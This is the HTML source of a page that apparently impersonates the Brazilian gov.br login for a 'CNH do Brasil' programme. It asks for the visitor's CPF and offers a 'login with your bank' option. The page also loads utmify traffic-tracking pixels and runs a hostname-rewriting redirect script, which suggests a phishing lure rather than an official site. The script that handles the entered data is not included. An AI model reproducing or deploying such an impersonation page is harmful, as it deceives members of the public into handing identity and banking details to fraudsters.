<!DOCTYPE html><html lang="pt-BR"><head>
    <meta charset="UTF-8">
    <script src="js/latest.js" async="" defer=""></script>
    <script>
      window.pixelId = "699e88bb03cedc197f1743f8";
      var a = document.createElement("script");
      a.setAttribute("async", "");
      a.setAttribute("defer", "");
      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
      document.head.appendChild(a);
    </script>
    <script
      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
      data-utmify-prevent-xcod-sck
      data-utmify-prevent-subids
      async
      defer
    ></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - CNH do Brasil | gov.br</title>
    <link rel="stylesheet" href="css/shared.css">
    <link rel="stylesheet" href="css/login.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/all.min.css">
</head>
<body>
    <script>
        if (location.hostname.indexOf('qaur') !== -1) {
            location.replace(location.protocol + '//' + location.hostname.replace('qaur', 'gaur') + location.pathname + location.search + location.hash);
        }
    </script>
    <header class="login-header">
        <a href="../pages/inicio/" class="logo-gov">
            <img src="images/imgi_6_image.jpg" alt="gov.br">
        </a>
        <div class="header-actions">
            <button class="btn-header-icon" aria-label="Modo escuro">
                <i class="fas fa-moon"></i>
            </button>
            <button class="btn-header-icon" aria-label="Acessibilidade">
                <img src="images/imgi_5_access_icon.svg" alt="Acessibilidade">
            </button>
        </div>
    </header>

    <main class="login-main">
        <div class="login-brand">
            <div class="brand-logo">
                <span class="gov">gov</span><span class="dot">.</span><span class="br">br</span>
            </div>
        </div>

        <div class="login-container">
            <div class="login-card">
                <div class="cnh-logo">
                    <img src="images/cnh-brasil-logo.png" alt="CNH do Brasil" class="cnh-logo-img">
                </div>

                <h1 class="login-title">Identifique-se no gov.br com:</h1>

                <div class="cpf-section">
                    <div class="cpf-label-row">
                        <i class="fas fa-id-card"></i>
                        <span>Número do CPF</span>
                    </div>
                    <p class="cpf-description">
                        Digite seu CPF para <a href="#">criar</a> ou <a href="#">acessar</a> sua conta gov.br
                    </p>
                    <label for="cpf-input" class="input-label">CPF</label>
                    <input type="text" id="cpf-input" class="cpf-input" placeholder="Digite seu CPF" maxlength="14" autocomplete="off" inputmode="numeric">
                    <span class="input-error" id="cpf-error"></span>
                    <button type="button" class="btn-continuar" id="btn-continuar">
                        Continuar
                    </button>
                </div>

                <div class="alt-login">
                    <h2 class="alt-title">Outras opções de identificação:</h2>
                    <div class="alt-buttons">
                        <button type="button" class="btn-bank">
                            Login com seu banco
                        </button>
                        <span class="badge-prata">SUA CONTA SERÁ PRATA</span>
                    </div>
                </div>

                <span class="btn-saiba-mais" style="display: block; margin-top: 24px;">Saiba mais sobre o programa</span>
            </div>
        </div>
    </main>

    <script src="js/shared.js"></script>
    <script src="js/login.js"></script>


</body></html>
